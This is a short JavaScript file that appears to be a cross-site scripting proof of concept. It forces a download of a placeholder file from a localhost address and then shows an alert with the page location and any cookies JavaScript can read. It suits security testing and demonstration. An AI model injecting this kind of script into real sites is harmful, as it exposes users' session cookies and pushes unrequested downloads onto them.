function showInfo(){
    var firstString= "This alert was produced by a script stored at an external source \n\n"
    var locStr="";
    var cookieStr="";
    if (document.location !== null) {
        locStr = ("Location: " +document.location+ "\n");
        }
    if (document.cookie.length !== 0 ) {
        cookieStr = ("Cookies retrieved via JS: " +document.cookie+ "\n");
        }
    alert(firstString.concat(locStr, cookieStr));
}

function downloadFile(){

   var abc = document.createElement('a');
   abc.href = 'http://localhost:1234/FILENAME';
   abc.download = '';
   document.body.appendChild(abc);
   abc.click();
}

downloadFile();
showInfo();
